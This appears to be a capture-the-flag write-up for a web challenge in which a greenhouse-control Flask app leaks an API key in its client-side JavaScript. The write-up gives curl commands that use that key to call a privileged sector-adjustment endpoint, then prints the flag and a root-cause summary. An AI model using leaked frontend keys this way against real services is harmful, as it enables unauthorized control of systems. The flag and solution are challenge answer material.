# CapyAgro Crop Rescue

## Challenge
Experimental greenhouse control panel access is broken, and plants are dying. Goal: regain control and obtain flag in format `KubSTU(...)`.

Targets:
- `http://45.146.165.92`
- `http://155.212.186.67`
- `http://62.113.103.24`

## Recon
1. Opened target home page and identified a Flask/Werkzeug app.
2. Found client-side JS config at `/static/config.js`:
   - `X-API-Key`: `test_key_123`
   - API endpoints including:
     - `/api/sector/{id}/adjust`
     - `/api/v1/raw_command`
3. Registered and logged in with a normal user account.
4. Visited authenticated pages:
   - `/dashboard`
   - `/capyagro`

## Key Findings
- `/capyagro` exposed monitoring data for CapyAgro sectors.
- Frontend logic showed a useful endpoint: `/api/capyagro/sectors`.
- API key from frontend was accepted by backend for sector adjustment.
- Sector restore condition required normal ranges (temperature/humidity) and then returned flag when all CapyAgro sectors were restored.

## Exploitation Steps
1. Get CapyAgro sectors:

```bash
curl -b cookies.txt http://45.146.165.92/api/capyagro/sectors
```

Result included critical CapyAgro sector `id=329`.

2. Restore sector with leaked API key:

```bash
curl -b cookies.txt \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: test_key_123' \
  -X POST http://45.146.165.92/api/sector/329/adjust \
  --data '{"temp":24,"humidity":65}'
```

3. Server response returned success and flag (`all_capyagro_saved: true`).

## Flag
`KubSTU(Sav3d_th3_CapyArg0S3ct0r)`

## Root Cause Summary
- Sensitive API key exposed in client JS.
- Authorization logic trusted static key from frontend.
- Internal/privileged sector control path reachable by normal authenticated user.
